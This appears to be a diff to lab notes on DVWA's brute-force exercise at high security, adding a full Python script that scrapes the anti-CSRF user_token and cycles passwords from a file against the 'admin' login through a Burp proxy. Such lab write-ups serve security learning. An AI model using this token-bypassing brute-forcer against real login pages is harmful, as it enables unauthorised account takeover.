@@ -60,23 +60,70 @@
 	     And the Sever checks the recieved token firstly, if token is valid, then the Server 
              operates the Sql queries.
 	     
-   * To achieve the goal at high security level, we need to write a phython script to brute force the password.
+* To achieve the goal at high security level, we need to write a phython script to brute force the password.
    
-   	* sending request to server to get response
-	
-			req = urllib.request.Request(url=requrl,headers=header)
+* sending request to server to get response
+
+		req = urllib.request.Request(url=requrl,headers=header)
 		
 * for getting ' user_token ' , we need to use BeautifulSoup package to read the reponse content, and parser the page to get 'token'
 	  
 		  soup = BeautifulSoup(the_page,"html.parser")
 		  user_token = soup.find('input',{'name':'user_token'})['value']
 	   
-	   
-                * by sending request to the server with following URL, which including the param 'user_token' additional
-	   	 ' requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token '
+* brute force the password by sending request to the server with following URL, which including the param 'user_token' additional
+
+	   	 requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token 
+		
+* for using the Brupsuite to intercept the whole runtime of python code, we need to set the ProxyHandler of those code, so that, the Proxy is same as Brupsuite's.
       
-      
-           
+      		proxy_handler = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+		opener = urllib.request.build_opener(proxy_handler)
+          
+##### Complete Code is as following:
+
+	from bs4 import BeautifulSoup
+	import urllib.request
+
+
+	proxy_handler = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
+	opener = urllib.request.build_opener(proxy_handler)
+
+
+	header = {
+		'Host': '192.168.178.34',
+			'Cache-Control': 'max-age=0',
+			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
+			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'Referer': 'http://192.168.178.34/vulnerabilities/brute/index.php',
+			'Accept-Encoding': 'zip, deflate',
+			'Accept-Language': 'zh-CN,zh;q=0.9',
+			'Cookie': 'security=high; PHPSESSID=ra6hjmncufirj8n9qgioejm854'
+			}
+
+	requrl = "http://192.168.178.34/vulnerabilities/brute/"
+
+	def get_token(requrl,header):
+		req = urllib.request.Request(url=requrl,headers=header)
+		response = opener.open(req)
+		the_page = response.read()
+		soup = BeautifulSoup(the_page,"html.parser")
+		print(len(the_page),response.getcode())
+		user_token = soup.find('input',{'name':'user_token'})['value']  #get the user_token
+		#print(user_token)
+		return user_token
+
+	user_token = get_token(requrl,header)
+
+	i=0
+
+	for line in open('test'):
+		requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
+		i = i+1
+		print(i,'admin',line.strip(),end=" ")
+		user_token = get_token(requrl, header)
+		if (i == 7):
+			break
         
         
     
